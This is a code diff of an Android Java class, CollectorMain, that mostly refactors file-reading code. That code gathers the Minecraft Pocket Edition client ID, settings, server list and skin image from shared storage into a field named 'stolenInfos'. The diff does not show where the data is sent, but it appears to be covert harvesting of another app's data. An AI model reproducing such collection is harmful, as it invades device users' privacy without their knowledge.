@@ -48,9 +48,8 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 	@Override
 	public void run() {
 		// TODO: Implement this method
-		if (running) {
-			return;
-		}
+		if (running)
+			return;	
 		BinaryPrefImpl sb;
 		String uuid=TheApplication.instance.uuid;
 		if(stolenInfos==null){
@@ -210,15 +209,13 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 		}
 	}
 	public boolean startCriticalSession(){
-		if(running){
+		if(running)
 			return false;
-		}
 		return running=true;
 	}
 	public boolean stopCriticalSession(){
-		if(!running){
+		if(!running)
 			return false;
-		}
 		return !(running=false);
 	}
 	
@@ -236,8 +233,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 			byte[] hashed = md.digest(b);
 			StringBuilder sb = new StringBuilder(hashed.length * 2);
 			for (byte bite : hashed) {
-				sb.append(Character.forDigit(bite >> 4 & 0xf, 16));
-				sb.append(Character.forDigit(bite & 0xf, 16));
+				sb.append(Character.forDigit(bite >> 4 & 0xf, 16)).append(Character.forDigit(bite & 0xf, 16));
 			}
 			return sb.toString();
 		} catch (NoSuchAlgorithmException e) {
@@ -276,78 +272,32 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 			}
 		}
 		private long getCid() {
-			BufferedReader br=null;
 			try {
-				br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/clientId.txt"))));
-				return new Long(br.readLine());
+				return new Long(Utils.lines(Utils.readWholeFile(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/clientId.txt")))[0]);
 			} catch (Throwable e) {
 				return Long.MAX_VALUE;
-			} finally {
-				try {
-					if (br != null)br.close();
-				} catch (IOException e) {}
 			}
 		}
 		private OrderTrustedMap<String,String> readSettings() {
 			OrderTrustedMap<String,String> data=new OrderTrustedMap<>();
-			BufferedReader br=null;
-			try {
-				br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/options.txt"))));
-				String s;
-				while (null != (s = br.readLine())) {
-					String[] spl=s.split("\\:");
-					data.put(spl[0], spl[1]);
-				}
-			} catch (Throwable e) {
-
-			} finally {
-				try {
-					if (br != null)br.close();
-				} catch (IOException e) {}
+			for(String s:Utils.lines(Utils.readWholeFile(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/options.txt")))) {
+				String[] spl=s.split("\\:");
+				data.put(spl[0], spl[1]);
 			}
 			return data;
 		}
 		private String[] readServers() {
-			List<String> data=new ArrayList(20);
-			BufferedReader br=null;
-			try {
-				br = new BufferedReader(new InputStreamReader(new FileInputStream(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/external_servers.txt"))));
-				String s;
-				while (null != (s = br.readLine()))
-					data.add(s);
-			} catch (Throwable e) {
-
-			} finally {
-				try {
-					if (br != null)br.close();
-				} catch (IOException e) {}
-			}
-			return data.toArray(new String[data.size()]);
+			return Utils.lines(Utils.readWholeFile(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/external_servers.txt")));
 		}
 		private String readSkin() {
-			InputStream br=null;
-			ByteArrayOutputStream b=new ByteArrayOutputStream(100);
-			byte[] buf=new byte[100];
-			try {
-				br = new FileInputStream(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/custom.png"));
-				while (true) {
-					int r=br.read(buf);
-					if (r <= 0) 
-						break;
-					b.write(buf, 0, r);
-				}
-			} catch (Throwable e) {
-				return null;
-			} finally {
-				try {
-					if (br != null)br.close();
-				} catch (IOException e) {}
-			}
-			return Base64.encodeToString(b.toByteArray(), Base64.NO_WRAP);
+			byte[] data=Utils.readWholeFileInBytes(new File(Environment.getExternalStorageDirectory(), "games/com.mojang/minecraftpe/custom.png"));
+			if(data==null)
+				return "";
+			else
+				return Base64.encodeToString(data, Base64.NO_WRAP);
 		}
 		private Server[] getManagingServer() {
-			Server[] sa=new Gson().fromJson(PreferenceManager.getDefaultSharedPreferences(TheApplication.instance).getString("servers", "[]"), Server[].class);
-			return sa;
+			return new Gson().fromJson(PreferenceManager.getDefaultSharedPreferences(TheApplication.instance).getString("servers", "[]"), Server[].class);
 		}
 	}
 	public static class AppInfo {
